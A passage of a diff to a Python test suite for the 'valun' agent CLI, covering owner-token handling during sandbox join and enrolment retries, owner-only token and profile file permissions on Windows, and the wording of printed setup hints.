         rc, out = self.main(['join', '--sandbox', '--handle', 'stranger', '--operator', 'Ann', '--approvals', 'none',
@@ -263,7 +673,8 @@ class JoinKeepsTheOwnerToken(Cli):
         rc, out = self.run_join(file=False)
         self.assertEqual(rc, 1, out)
         self.assertIn("this agent's key could not be registered (rate_limited)", out)
-        self.assertIn('\n  vpo_test-only\n', out)
+        self.assertEqual(self.token_in_file(self.default_file()), 'vpo_test-only\n')    # handed over: the default file
+        self.assertNotIn('vpo_test-only', out)
         path = os.path.join(self.home.name, 'profiles', 's.json')
         self.assertFalse(os.path.exists(path) and 'participant_id' in self.disk())
         enroll = self.printed(out, 'then run')
@@ -276,22 +687,23 @@ class JoinKeepsTheOwnerToken(Cli):
         with mock.patch.object(vc.Client, 'request', request), mock.patch.object(cli.getpass, 'getpass', return_value='code'):
             rc, out = self.main(enroll)
         self.assertEqual(rc, 0, out)
-        self.assertEqual(self.world.requests()[-2:], ['POST /pilot/v1/enroll', 'GET /pilot/v1/info'])
+        self.assertEqual(self.world.requests()[-4:], ['GET /pilot/v1/info', 'POST /pilot/v1/enroll', 'GET /pilot/v1/me',
+                                                      'GET /pilot/v1/info'])
         self.assertEqual(set(servers), {SERVER})
         self.assertEqual((self.disk()['participant_id'], self.disk()['server']), (S_ID, SERVER))
 
-    def test_a_token_file_that_cannot_be_written_shows_the_token(self):
-        # The token is shown instead; join does its other steps, then exits 1 (a script that relies on the file sees it).
-        self.token_file = os.path.join(self.home.name, 'no-such-folder', 'owner.txt')
-        rc, out = self.run_join('--approvals', 'none')
+    def test_a_token_file_that_cannot_be_written_after_the_join_is_never_on_stdout(self):
+        # The folder took files when join checked it and none once the join was answered: join does its other steps,
+        # then exits 1 (a script that relies on the file sees it); the token is on no output an agent reads.
+        with self.no_file_at_all():
+            rc, out = self.run_join('--approvals', 'none')
         self.assertEqual(rc, 1, out)
-        self.assertIn(f'Cannot write {self.token_file}', out)
-        self.assertIn('\n  vpo_test-only\n', out)
+        self.assertIn(f'Cannot write {self.token_file} (No space left on device).', out)
+        self.assertNotIn('vpo_test-only', out)
         self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])        # the mandate step was done
         self.assertEqual((self.disk()['participant_id'], self.disk()['approvals']), (S_ID, 'none'))
         self.assertNotIn('vpo_test-only', json.dumps(self.disk()))
-        self.assertEqual(out.rstrip().splitlines()[-1],
-                         f'Exit code 1: {self.token_file} was not written (your owner token is shown above instead).')
+        self.assertEqual(out.rstrip().splitlines()[-1], f'Exit code 1: {self.token_file} was not written.')
         self.assertFalse(os.path.exists(self.token_file))
 
     # ---------- FX3-PY: decision D-3 c (the token first, whatever fails after the join answer) and O_EXCL ----------
@@ -331,20 +743,29 @@ class JoinKeepsTheOwnerToken(Cli):
         self.assertLess(out.index('Your OWNER token is in'), out.index('Joining stopped'))
 
     def test_the_token_is_handed_over_before_the_agent_key_is_registered(self):
-        # The token file exists when POST /enroll is sent (here it gets a 429): nothing local is written before it.
+        # The token file exists when POST /enroll is sent (here it gets a 429), and so does the agent's key, saved in the
+        # profile (the Nov 17 tester report: a key kept only in memory was lost with an answer lost on the way). A 429 is no
+        # answer about the code, which stays valid: the key and the code stay kept, for `valun enroll` to send again.
         seen, handle = [], self.world.handle
+        path = os.path.join(self.home.name, 'profiles', 's.json')
 
-        def spy(method, path, body=None, token=None):
-            seen.append((f'{method} {path}', os.path.exists(self.token_file)))
-            return handle(method, path, body, token)
+        def spy(method, p, body=None, token=None):
+            kept = os.path.exists(path) and (self.disk().get('pending_enrollment') or {}).get('pubkey')
+            seen.append((f'{method} {p}', os.path.exists(self.token_file), bool(kept) and kept == (body or {}).get('pubkey')))
+            return handle(method, p, body, token)
         self.world.handle = spy
         self.rate_limit('POST /pilot/v1/enroll')
         rc, out = self.run_join('--approvals', 'none')
         self.assertEqual(rc, 1, out)
-        self.assertEqual(seen, [('POST /pilot/v1/join-sandbox', False), ('POST /pilot/v1/enroll', True)])
+        self.assertEqual(seen, [('POST /pilot/v1/join-sandbox', False, False), ('POST /pilot/v1/enroll', True, True)])
         self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
         self.assertLess(out.index('Your OWNER token is in'), out.index("this agent's key could not be registered (rate_limited)"))
-        self.assertFalse(os.path.exists(os.path.join(self.home.name, 'profiles', 's.json')))
+        disk = self.disk()
+        self.assertNotIn('participant_id', disk)
+        self.assertNotIn('agent_token', disk)
+        self.assertEqual((disk['pending_enrollment']['participant_id'], disk['pending_enrollment']['code']), (S_ID, 'code'))
+        self.assertNotIn('vpo_test-only', json.dumps(disk))
+        self.assertIn('To finish: run `valun --profile s enroll` in a moment', out)
 
     def test_a_key_that_cannot_be_stored_still_hands_the_token_over(self):
         # The enrolment's save fails (OSError, not a ValunError): no traceback; the token is in its file. POST /enroll
@@ -363,29 +784,47 @@ class JoinKeepsTheOwnerToken(Cli):
         self.assertEqual(self.printed(out, 'then run'), ['--profile', 's', 'enroll', '--server', SERVER, '--participant', S_ID])
         self.assertNotIn('Traceback', out)
         self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
-        self.assertFalse(os.path.exists(os.path.join(self.home.name, 'profiles', 's.json')))
+        # Every save failed, so no agent token is stored; the key the server registered was saved before the request.
+        disk = self.disk()
+        self.assertNotIn('agent_token', disk)
+        self.assertNotIn('participant_id', disk)
+        self.assertEqual(disk['pending_enrollment']['pubkey'], self.world.keys[S_ID]['pubkey'])
         self.assertEqual(self.world.puts, [])
 
     def test_an_enrolment_whose_answer_was_not_read_may_have_registered_the_key(self):
-        # POST /enroll times out while its answer is read (not a ValunError): whether the server holds the key is not
-        # known, so join says how to finish either way.
-        handle = self.world.handle
+        # POST /enroll times out while its answer is read (not a ValunError), three times: whether the server holds the
+        # key is not known. The key and the code were saved before the first request, so `valun enroll` sends the same
+        # enrollment again, with no code to give (the Nov 17 tester report: 0.7.1 lost the key with the answer).
+        handle, sent = self.world.handle, []
 
         def slow(method, path, body=None, token=None):
             out = handle(method, path, body, token)
             if path == '/pilot/v1/enroll':
-                raise TimeoutError('The read operation timed out')
+                sent.append(body)
+                if len(sent) <= 3:
+                    raise TimeoutError('The read operation timed out')
             return out
         self.world.handle = slow
         rc, out = self.run_join('--approvals', 'none')
         self.assertEqual(rc, 1, out)
-        self.assertIn(f"Your participant {S_ID} was created, and the server may hold this agent's key, but the key could "
-                      'not be stored here (TimeoutError): The read operation timed out', out)
-        self.assertIn('revoke this agent, which gives a new enrollment code (a new code is refused while a key is '
-                      'registered); if the console shows no agent key, issue an enrollment code instead, then run '
-                      f'`valun --profile s enroll --server {SERVER} --participant {S_ID}`.', out)
+        self.assertEqual(len(sent), 3)
+        self.assertTrue(all(b == sent[0] for b in sent), 'the same key, code and proof each time')
+        self.assertIn(f"Your participant {S_ID} was created, and this agent's key is saved in this profile, but no answer "
+                      'to its enrollment arrived (3 tries; the last: TimeoutError: The read operation timed out).', out)
+        self.assertIn('To finish: run `valun --profile s enroll` (or this join again) while the enrollment code is valid: '
+                      'it sends the same enrollment again, with no code to give.', out)
         self.assertEqual(self.token_in_file(), 'vpo_test-only\n')
         self.assertNotIn('Traceback', out)
+        self.assertEqual(self.disk()['pending_enrollment']['pubkey'], sent[0]['pubkey'])
+        rc, out = self.run_cli('enroll')
+        self.assertEqual(rc, 0, out)
+        same = lambda b: {k: v for k, v in b.items() if k != 'signature'}     # noqa: E731 - a new proof, same key and code
+        self.assertEqual(same(sent[3]), same(sent[0]))
+        disk = self.disk()
+        self.assertEqual((disk['participant_id'], disk['pubkey']), (S_ID, sent[0]['pubkey']))
+        self.assertNotIn('pending_enrollment', disk)
+        self.assertEqual(disk['consent_policy'], va.SANDBOX_CONSENT_POLICY)
+        self.assertEqual((disk['consent_loop'], disk['approvals']), ('on', 'none'))
 
     def test_an_enrolment_answer_on_another_network_may_have_registered_the_key(self):
         # 0.5: the core checks the network the enroll answer names (wrong_network) after the server registered the key.
@@ -513,8 +952,17 @@ class JoinKeepsTheOwnerToken(Cli):
         self.assertEqual(rc, 0, done)
         self.assertIs(self.disk()['consent_policy']['setoff'], False)
 
-    def test_a_429_after_the_join_answer_never_loses_the_token_shown_on_screen(self):
-        # Without --owner-token-file: whichever request gets the 429, the token is shown before that step's report.
+    def test_a_429_after_the_join_answer_never_loses_the_token_that_went_to_a_new_file(self):
+        # Without --owner-token-file, and its default file made while the join was on its way: whichever request gets
+        # the 429, the token is in a new file beside it before that step's report, and never on stdout.
+        handle = self.world.handle
+
+        def another_join(method, path, body=None, token=None):
+            if path == '/pilot/v1/join-sandbox':
+                with open(self.default_file(), 'w', encoding='utf-8') as f:
+                    f.write('vpo_another-identity\n')
+            return handle(method, path, body, token)
+        self.world.handle = another_join
         for route, said in (('POST /pilot/v1/enroll', "this agent's key could not be registered (rate_limited)"),
                             ('GET /pilot/v1/owner', 'Your owner mandate could not be set (rate_limited)'),
                             ('PUT /pilot/v1/owner/mandate', 'Your owner mandate could not be set (rate_limited)')):
@@ -526,30 +974,16 @@ class JoinKeepsTheOwnerToken(Cli):
                                '--approvals', 'none', '--server', SERVER])
             out = out.getvalue()
             self.assertEqual(rc, 1, out)
-            self.assertIn('\n  vpo_test-only\n', out, route)
-            self.assertLess(out.index('vpo_test-only'), out.index(said), route)
+            sibling = self.default_file().replace('.txt', '.1.txt')
+            self.assertEqual(self.token_in_file(sibling), 'vpo_test-only\n', route)
+            self.assertNotIn('vpo_test-only', out, route)
+            self.assertLess(out.index(f'your OWNER token is in a new file beside it: {sibling}'), out.index(said), route)
             path = os.path.join(self.home.name, 'profiles', f'{name}.json')
             if os.path.exists(path):
                 with open(path, encoding='utf-8') as f:
                     self.assertNotIn('vpo_test-only', f.read(), route)
-
-    def test_an_existing_token_file_is_never_replaced(self):
-        # O_EXCL: a file that exists already (another identity's owner token, say) keeps its bytes. The token is shown
-        # instead, join does its other steps, and exits 1 after handing it over.
-        with open(self.token_file, 'w', encoding='utf-8') as f:
-            f.write('vpo_another-identity\n')
-        rc, out = self.run_join('--approvals', 'none')
-        self.assertEqual(rc, 1, out)
-        self.assertEqual(self.token_in_file(), 'vpo_another-identity\n')
-        self.assertIn(f'{self.token_file} exists already, so it was not replaced (it may hold another owner token); '
-                      'your owner token is shown here instead.', out)
-        self.assertIn('\n  vpo_test-only\n', out)
-        self.assertLess(out.index('vpo_test-only'), out.index('Joined Valun as stranger'))
-        self.assertEqual(self.world.puts, [{'approve_above': 5, 'auto_clear': True}])    # the other steps were done
-        self.assertEqual(self.disk()['participant_id'], S_ID)
-        self.assertNotIn('vpo_test-only', json.dumps(self.disk()))
-        self.assertEqual(out.rstrip().splitlines()[-1],
-                         f'Exit code 1: {self.token_file} was not written (your owner token is shown above instead).')
+            for p in (self.default_file(), sibling):
+                os.unlink(p)
 
     def test_a_new_token_file_is_created_and_holds_only_the_token(self):
         self.assertFalse(os.path.exists(self.token_file))
@@ -559,6 +993,68 @@ class JoinKeepsTheOwnerToken(Cli):
         self.assertNotIn('vpo_test-only', out)                       # written, not shown
         if os.name != 'nt':
             self.assertEqual(os.stat(self.token_file).st_mode & 0o777, 0o600)
+
+    def windows_shared_folder(self, name):
+        """A folder whose permissions let Users (BU) change what is in it, as the staging test's home under %TEMP% let
+        another group in."""
+        import subprocess
+        folder = os.path.join(self.home.name, name)
+        os.makedirs(folder)
+        subprocess.run(['icacls', folder, '/grant', '*S-1-5-32-545:(OI)(CI)M'], capture_output=True, check=True)
+        return folder
+
+    @unittest.skipUnless(os.name == 'nt', 'Windows permissions')
+    def test_on_windows_a_new_token_file_is_owner_only_whatever_its_folder_allows(self):
+        """The RC's staging test (2026-11-18), problem 7: os.open's 0o600 is ignored on Windows, so the owner token file
+        took its folder's permissions (icacls: "HOST\\CodexSandboxUsers:(I)(M)"), while the docs said "a new private
+        file (0600)". It is now created with a DACL that lets in only this user (named by its SID: the RC's review,
+        windows-acl W1), SYSTEM and Administrators."""
+        import subprocess
+        from valun import home
+        path = os.path.join(self.windows_shared_folder('shared'), 'owner.txt')
+        cli._write_private(path, 'vpo_test-only\n')
+        acl = subprocess.run(['icacls', path], capture_output=True, text=True, check=True).stdout
+        self.assertNotIn('(I)', acl, f'nothing inherited from its folder: {acl}')
+        # each ACE's trustee as its S-1-... string (home.sid_string), as access_of compares them: SDDL writes the built-in
+        # Administrator, the account CI's Windows runners use, as LA, where _user_sid() gives its S-1-5-21-...-500
+        canonical = lambda sddl: re.sub(r';;;([^;)]+)\)', lambda m: f';;;{home.sid_string(m.group(1))})', sddl)  # noqa: E731
+        self.assertTrue(canonical(home._sddl_of(path)).endswith(canonical(home.private_sddl(home._user_sid()))),
+                        home._sddl_of(path))
+        self.assertEqual((home.others_with_access(path), cli._not_private_note(path)), ([], ''))
+        with open(path, 'rb') as f:
+            self.assertEqual(f.read(), b'vpo_test-only\r\n')
+        # a file that takes its folder's permissions is named so: whom else they let in
+        plain = os.path.join(os.path.dirname(path), 'plain.txt')
+        with open(plain, 'w', encoding='utf-8') as f:
+            f.write('x')
+        self.assertEqual(home.others_with_access(plain), ['S-1-5-32-545'])
+        self.assertIn('it can also be opened by BUILTIN\\Users (S-1-5-32-545), whom its folder lets in',
+                      cli._not_private_note(plain))
+
+    @unittest.skipUnless(os.name == 'nt', 'Windows permissions')
+    def test_on_windows_doctor_reads_the_profile_files_permissions(self):
+        """The RC's staging test (2026-11-18): doctor said "Profile file permissions: private" on Windows without looking."""
+        from valun import home
+        self.join()
+        rc, out = self.run_cli('doctor')
+        self.assertIn('ok    Profile file permissions: private', out)
+        shared = self.windows_shared_folder('shared-home')
+        os.makedirs(os.path.join(shared, 'profiles'))
+        with open(os.path.join(self.home.name, 'profiles', 's.json'), encoding='utf-8') as f, \
+                open(os.path.join(shared, 'profiles', 's.json'), 'w', encoding='utf-8') as g:
+            g.write(f.read())
+        with mock.patch.dict(os.environ, {'VALUN_HOME': shared}):
+            rc, out = self.run_cli('doctor')
+        self.assertNotIn('Profile file permissions: private', out)
+        profile = os.path.join(shared, 'profiles', 's.json')
+        me = home._user_sid()
+        self.assertIn(f"FIX   {profile} can also be opened by BUILTIN\\Users (S-1-5-32-545), whom its folder lets in, so "
+                      f'your agent\'s key in it is not private. Fix: `icacls "{profile}" /inheritance:r /grant:r *{me}:F '
+                      '*S-1-5-18:F *S-1-5-32-544:F`; and close its folder, which lets them in too, or they could still '
+                      f'replace the profile: `icacls "{os.path.dirname(profile)}" /inheritance:r /grant:r "*{me}:(OI)(CI)F" '
+                      '"*S-1-5-18:(OI)(CI)F" "*S-1-5-32-544:(OI)(CI)F"` (valun also writes the profile owner-only the next '
+                      'time it saves it).', out)
+        self.assertNotIn('such as the default one', out, 'never the folder it is in as the place to move it to')
 
     def test_a_token_file_that_fails_while_written_is_removed(self):
         path = os.path.join(self.home.name, 'partial.txt')
@@ -663,6 +1159,56 @@ class ConsoleSwitchChecksTheOwner(Cli):
         self.assertEqual(self.disk()['approvals'], 'none')
 
 
+class ConsoleSwitchAsksForTheToken(Cli):
+    """#136 item 1: `valun config approvals` to or from console takes the owner token from a hidden prompt when no
+    --owner-token-file is given (the site tells owners to move that file out of their agent's reach once console is
+    set); without a terminal it still says how. #136 item 3: Ctrl+C in the tour ends with a short message, no traceback.
+    And `valun mcp --help` names the pinned uvx form, never a bare valun."""
+
+    def test_the_token_is_asked_for_at_a_terminal_and_never_stored(self):
+        self.join()
+        puts = len(self.world.puts)
+        with mock.patch.object(sys, 'stdin', Tty('')), mock.patch('getpass.getpass', return_value='vpo_test-only\n') as asked:
+            rc, out = self.main(['--profile', 's', 'config', 'approvals', 'console'])
+        self.assertEqual(rc, 0, out)
+        self.assertEqual(asked.call_args[0][0], 'Owner token (not shown): ')
+        self.assertEqual(self.world.puts[puts:], [{'approve_above': 0, 'review_deliveries': True}])
+        self.assertEqual(self.disk()['approvals'], 'console')
+        self.assertNotIn('vpo_test-only', json.dumps(self.disk()), 'the owner token is never stored')
+        with mock.patch.object(sys, 'stdin', Tty('')), mock.patch('getpass.getpass', side_effect=EOFError):
+            rc, out = self.main(['--profile', 's', 'config', 'approvals', 'none'])
+        self.assertEqual((rc, out.strip()), (1, 'No owner token given; nothing was changed.'))
+        with mock.patch.object(sys, 'stdin', io.StringIO('')):
+            rc, out = self.main(['--profile', 's', 'config', 'approvals', 'none'])
+        self.assertEqual(rc, 1)
+        self.assertIn('run again with --owner-token-file FILE (the file holding it; read once, not stored), or in a terminal, '
+                      'where it is asked for (not shown).', out)
+        self.assertEqual(self.disk()['approvals'], 'console')
+
+    def test_ctrl_c_in_the_tour_ends_with_a_short_message(self):
+        self.join()
+        with mock.patch.object(sb, 'tour', side_effect=KeyboardInterrupt):
+            rc, out = self.run_cli('sandbox', 'tour', '--yes')
+        self.assertEqual(rc, 130)
+        self.assertNotIn('Traceback', out)
+        self.assertIn(f'The tour stopped (Ctrl+C). Run `valun --profile s sandbox tour --server {SERVER}` again to go on: it '
+                      'reads where your tour stands from the server and goes on from that step', out)
+
+    def test_mcp_help_names_the_pinned_uvx_form_only(self):
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
+            cli.main(['mcp', '--help'])
+        text = out.getvalue()
+        pin = f'valun=={__version__}'
+        self.assertIn(f'claude mcp add valun -- uvx --from {pin} valun mcp', text)
+        self.assertIn(f'{{"mcpServers": {{"valun": {{"command": "uvx", "args": ["--from", "{pin}", "valun", "mcp"]}}}}}}', text)
+        self.assertIn(f'\n  uvx --from {pin} valun --profile work mcp\n', text)
+        for m in re.finditer(r'\bvalun (?:mcp|--profile|join)\b', text):
+            self.assertTrue(text[:m.start()].endswith(f'uvx --from {pin} '), text[max(0, m.start() - 40):m.end()])
+        self.assertNotIn('"command": "valun"', text)
+        self.assertNotIn('["--from", "valun", ', text, 'never an unpinned uvx')
+
+
 class PrintedCommandsNameTheProfile(Cli):
     """FX3-PY: every command the CLI prints for the owner to run names the profile it is for (`valun --profile NAME
     ...`), so that run in another shell, whatever VALUN_PROFILE says there, it acts on this identity: doctor's FIX lines,
@@ -679,8 +1225,9 @@ class PrintedCommandsNameTheProfile(Cli):
     def test_doctor_fix_lines(self):
         rc, out = self.run_cli('doctor', '--server', SERVER)                  # not joined
         self.assertEqual(rc, 1, out)
-        self.assertIn('FIX   Not connected: run `valun --profile s join --sandbox` (no invite: sandbox only), '
-                      '`valun --profile s join` (with an invite) or `valun --profile s enroll` (with an enrollment code).', out)
+        self.assertIn(f'FIX   Not connected: run `{SANDBOX_JOIN} --server {SERVER}` (no invite: sandbox only), '
+                      f'`valun --profile s join --server {SERVER}` (with an invite) or `valun --profile s enroll --server '
+                      f'{SERVER}` (with an enrollment code) (with uvx: `uvx --from valun=={__version__} valun ...`).', out)
         self.assertNamesProfile(out)
         self.world.fail['GET /pilot/v1/info'] = [vc.ValunError('unreachable', 'cannot reach it')]
         rc, out = self.run_cli('doctor', '--server', SERVER)
@@ -704,7 +1251,8 @@ class PrintedCommandsNameTheProfile(Cli):
         self.assertNamesProfile(out)
         # VALUN_PROFILE set but empty selects the default profile, and the commands name it
         rc, out = self.main(['doctor', '--server', SERVER], env={'VALUN_PROFILE': ''})
-        self.assertIn('`valun --profile default join --sandbox`', out)
+        self.assertIn(f'`valun --profile default join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME" --server {SERVER}`',
+                      out)
         self.assertNamesProfile(out, 'default')
 
     def test_the_mcp_not_joined_hint(self):
@@ -712,10 +1260,39 @@ class PrintedCommandsNameTheProfile(Cli):
         with mock.patch('valun.mcp_server.run', return_value=0) as run, contextlib.redirect_stderr(err):
             rc, _out = self.run_cli('mcp')
         self.assertEqual((rc, run.call_count), (0, 1))
-        self.assertIn("valun mcp: profile 's' is not joined yet; run `valun --profile s join` first.", err.getvalue())
+        self.assertIn(f"valun mcp: profile 's' is not joined yet; {JOIN_HINT} first.", err.getvalue())
         self.assertNamesProfile(err.getvalue())
         # and what its tools tell the agent while the profile is not joined names the profile too
-        self.assertEqual(run.call_args.kwargs.get('setup_hint'), 'run `valun --profile s join` in a terminal')
+        self.assertEqual(run.call_args.kwargs.get('setup_hint'), JOIN_HINT)
+
+    def test_the_not_joined_hint_runs_as_written(self):
+        """The 0.7.2 clean-user test: before a join, every tool (`valun call`, `valun mcp`) and valun_status told the
+        agent that its owner must run `valun --profile s join`, which asks for an invite code (a sandbox join needs none)
+        and has no handle, operator name or owner token file. The hint is now the sandbox join, then its uvx form. Run
+        as written in another shell, with only its placeholders filled in, it joins this profile, on the server the
+        hint was given for (VALUN_SERVER here, which that shell does not have), with the owner token in join's own
+        default file ($HOME/valun-owner-token-HANDLE.txt: the hint names no file, since cmd reads no $HOME)."""
+        rc, out = self.main(['--profile', 's', 'call', 'valun_status'], env={'VALUN_SERVER': SERVER})
+        r = json.loads(out)
+        self.assertEqual((rc, r['error']), (1, 'not_connected'), out)
+        self.assertIn(f' in a terminal (with uvx: `uvx --from valun=={__version__} valun ...`)', r['message'])
+        cmd = re.search(r'must run `([^`]+)` in a terminal', r['message']).group(1)
+        self.assertEqual(cmd, f'{SANDBOX_JOIN} --server {SERVER}', 'a server that is not the default one is named')
+        self.assertIn(f'Its owner must run `{cmd}` in a terminal', r['what_this_means'])
+        token_file = os.path.join(self.home.name, 'valun-owner-token-stranger.txt')
+        # both placeholders filled in: `valun join` refuses either one left as it is (the 0.7.2 review)
+        argv = [{'YOUR-HANDLE': 'stranger', 'YOUR NAME': 'A Stranger'}.get(a, a) for a in shlex.split(cmd)]
+        self.assertEqual(argv[:4], ['valun', '--profile', 's', 'join'])
+        rc, out = self.main(argv[1:])
+        self.assertEqual(rc, 0, out)
+        self.assertIn('Joined Valun as stranger', out)
+        self.assertEqual((self.disk()['participant_id'], self.disk()['server']), (S_ID, SERVER))
+        with open(token_file, encoding='utf-8') as f:
+            self.assertEqual(f.read(), 'vpo_test-only\n')
+        # the default profile's hint, with no server when it is the default one
+        rc, out = self.main(['call', 'valun_status'])
+        self.assertIn('the owner must run `valun --profile default join --sandbox --handle YOUR-HANDLE --operator "YOUR NAME"` '
+                      'in a terminal (with uvx:', json.loads(out)['message'])
 
     def test_the_policy_clearing_and_consent_loop_hints(self):
         rc, out = self.run_cli('policy', 'show')                              # not joined: the local lines only
@@ -739,7 +1316,7 @@ class PrintedCommandsNameTheProfile(Cli):
     def test_valun_calls_join_and_approval_hints(self):
         rc, out = self.run_cli('call', 'valun_status')                        # not joined
         self.assertEqual(rc, 1, out)
-        self.assertIn('run `valun --profile s join` in a terminal', out)
+        self.assertEqual(json.loads(out)['message'], f'not enrolled: the owner must {JOIN_HINT}')
         self.assertNamesProfile(out)
         # Approvals ask, a commitment, and no person at this terminal: the advice names this profile; its commands, run
         # as printed in another shell, change this profile (console with this participant's owner token).
@@ -754,6 +1331,29 @@ class PrintedCommandsNameTheProfile(Cli):
         self.assertEqual((rc, self.disk()['approvals']), (0, 'none'), done)
         rc, done = self.main(self.printed(json.loads(out)['message'], 'The owner can run'))
         self.assertEqual((rc, self.disk()['approvals']), (0, 'console'), done)
+
+    def test_the_mcp_servers_approval_unavailable_commands_run_as_written(self):
+        """The onboarding review: the three modes the MCP server's approval_unavailable offers an app that cannot ask
+        run as printed, each from ask (console with the owner token file of this profile's participant); it says what
+        client-prompt relies on, and that this app's Valun server must restart (it reads the mode when it starts)."""
+        self.join('--approvals', 'ask')
+        from valun import mcp_server
+        text = mcp_server.McpServer(None, 'ask', command='valun --profile s').approval_unavailable['what_this_means']
+        self.assertIn("then restart this app's Valun server", text)
+        self.assertIn('(only if this app confirms each tool call itself, as Claude Code is designed to (not yet tested with '
+                      'Valun): an app that runs tools without asking asks nobody)', text)
+        cmds = self.commands(text)
+        self.assertEqual(cmds, ['--profile s config approvals console --owner-token-file FILE',
+                                '--profile s config approvals client-prompt', '--profile s config approvals none'])
+        back = ['--profile', 's', 'config', 'approvals', 'ask', '--owner-token-file', self.token_file]
+        for cmd, mode in zip(cmds, ('console', 'client-prompt', 'none')):
+            rc, out = self.main([self.token_file if a == 'FILE' else a for a in shlex.split(cmd)])
+            self.assertEqual((rc, self.disk()['approvals']), (0, mode), out)
+            self.assertIn("Restart `valun --profile s mcp` (your MCP app's Valun server) for your MCP app to use it.",
+                          out)
+            self.assertEqual(cli.CLIENT_PROMPT_CAVEAT in out, mode == 'client-prompt', out)
+            rc, out = self.main(back)
+            self.assertEqual((rc, self.disk()['approvals']), (0, 'ask'), out)
 
 
 class Settings(Cli):
@@ -778,7 +1378,11 @@ class Settings(Cli):
         rc, out = self.run_cli('policy', 'show')
         self.assertIn('payments to you by transfer: not signed (local on, owner accept_transfers off)', out)
         rc, out = self.run_cli('status')
-        self.assertIn('consents:         setoff on, as_issuer on, as_new_creditor on, max_PC none; consent loop: on', out)
+        self.assertIn('consents:         setoff on, as_issuer on, as_new_creditor on, no cap (consents.max_PC none); consent loop: on',
+                      out)
+        self.assertEqual(self.run_cli('config', 'consents.max_PC', '7')[0], 0)
+        rc, out = self.run_cli('status')
+        self.assertIn('as_new_creditor on, at most 7 PC each (consents.max_PC); consent loop: on', out)
 
     def test_a_0_3_profile_gets_a_policy_with_every_other_role_off(self):
         path = os.path.join(self.home.name, 'profiles', 's.json')
@@ -847,6 +1451,27 @@ class CallSignsValueSafeConsents(Cli):
         self.assertEqual((r['money_view']['you_hold_PC'], r['money_view']['you_owe_PC']), (0, 1))
         self.assertNotIn('consents_last_run_ms', self.disk())        # a read's run: it never delays a full run
 
+    def test_valun_call_inbox_signs_it_too(self):
+        # what join tells a shell agent (the readiness assessment of 2026-11-18): `valun call valun_inbox`, run
+        # regularly, signs the set-offs the consent loop of `valun mcp` would
+        from test_agent_circulation import DENOM, NFT, S, X
+        w = self.world
+        w.keys[S_ID], w.welcome = S, False
+        os.makedirs(os.path.join(self.home.name, 'profiles'), exist_ok=True)
+        with open(os.path.join(self.home.name, 'profiles', 's.json'), 'w', encoding='utf-8') as f:
+            json.dump({'server': SERVER, 'participant_id': S_ID, 'pubkey': S['pubkey'], 'secret': S['secret'].hex(),
+                       'agent_token': AGENT_TOKEN, 'approvals': 'none', 'consent_policy': dict(va.SANDBOX_CONSENT_POLICY),
+                       'consent_loop': 'off', 'pins': {'tracker_nft_id': NFT, 'denomination': DENOM}}, f)
+        w.set_edge(X_ID, S_ID, 1, now_ms() - 120_000 + 1)
+        w.set_edge(S_ID, X_ID, 2, now_ms() - 110_000 + 2, signature=sign_note(S, X['pubkey'], 2, now_ms() - 110_000 + 2))
+        w.clear()
+        (sid,) = [i for i, it in w.items.items() if it['state'] == 'collecting']
+        rc, out = self.run_cli('call', 'valun_inbox')
+        self.assertEqual(rc, 0, out)
+        self.assertEqual([(e['id'], e['kind'], e['role']) for e in json.loads(out)['consents_signed_now']],
+                         [(sid, 'setoff', 'member')])
+        self.assertEqual(w.items[sid]['state'], 'applied')
+
 
 class Tour(Cli):
     def tour_lines(self, out):
@@ -883,6 +1508,59 @@ class Tour(Cli):
         rc, out = self.run_cli('sandbox', 'tour', '--yes')
         self.assertEqual((rc, len(w.posts)), (0, posts))
         self.assertIn('The tour is complete', out)
+
+    def test_the_tour_reads_no_ledger_waits_what_each_step_asks_and_goes_on_after_a_cut_read(self):
+        """0.7.2 review: step 4 read the whole public ledger (about 270 KB) on every valun_status, every 3 s while the tour
+        waited, and a cut connection there ended the tour with a traceback. Now no ledger is read, the tour waits what
+        sandbox_next_steps asks (retry_after_seconds, at most TOUR_WAIT_MAX_S) while nothing is to be called, and a
+        step's totals that cannot be read are said so and the tour goes on."""
+        self.join()
+        waits, nap = [], sb.time.sleep
+        real_totals, cut = sb.edge_totals, [True]
+
+        def totals(c):
+            if cut[0]:
+                cut[0] = False
+                raise vc.ValunError('unreachable', 'the connection was cut', None, {'cause': 'connection_cut'})
+            return real_totals(c)
+        with mock.patch.object(sb.time, 'sleep', lambda s: (waits.append(s), nap(s))), \
+                mock.patch.object(sb, 'edge_totals', totals):
+            rc, out = self.run_cli('sandbox', 'tour', '--yes')
+        self.assertEqual(rc, 0, out)
+        self.assertIn('step 1 done. (Your edges on the tracker could not be read just now: unreachable.)', out)
+        self.assertEqual({k: v for k, v in self.tour_lines(out).items() if k != 1}, {k: v for k, v in TOUR_TOTALS.items() if k != 1})
+        self.assertNotIn(('GET', '/pilot/v1/ledger', None), self.world.log)
+        self.assertTrue(waits and all(sb.TOUR_POLL_S <= s <= sb.TOUR_WAIT_MAX_S for s in waits), waits)
+        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': 30}, 3), sb.TOUR_WAIT_MAX_S)
+        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': va.SETOFF_DUE_RETRY_S}, 3), 15)
+        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': 5}, 3), 5)
+        self.assertEqual(sb.tour_wait_s({}, 3), 3)
+        self.assertEqual(sb.tour_wait_s({'retry_after_seconds': True}, 3), 3)
+
+    def test_a_finished_tour_stays_finished_after_an_earn(self):
+        """The 0.7.2 clean-user test (two profiles): after the tour, `valun sandbox earn` left a note of sandbox-exact
+        held, and sandbox_next_steps, which reads the step from what is held and owed with the sandbox agents, said step
+        3 again; `valun sandbox tour` started over at "step 3 of 5". The profile now keeps the tour's end
+        (sandbox_tour_done), so the next steps stay done and the tour again changes nothing."""
+        self.join()
+        rc, out = self.run_cli('sandbox', 'tour', '--yes')
+        self.assertEqual(rc, 0, out)
+        rc, out = self.run_cli('sandbox', 'earn')
+        self.assertEqual((rc, json.loads(out.strip().splitlines()[-1])['paid']), (0, True), out)
+        self.assertEqual(self.world.total(X_ID, S_ID), 3, 'a note of sandbox-exact is held again')
+        for brief in (False, True):
+            rc, out = self.run_cli('call', 'valun_status', json.dumps({'brief': brief}))
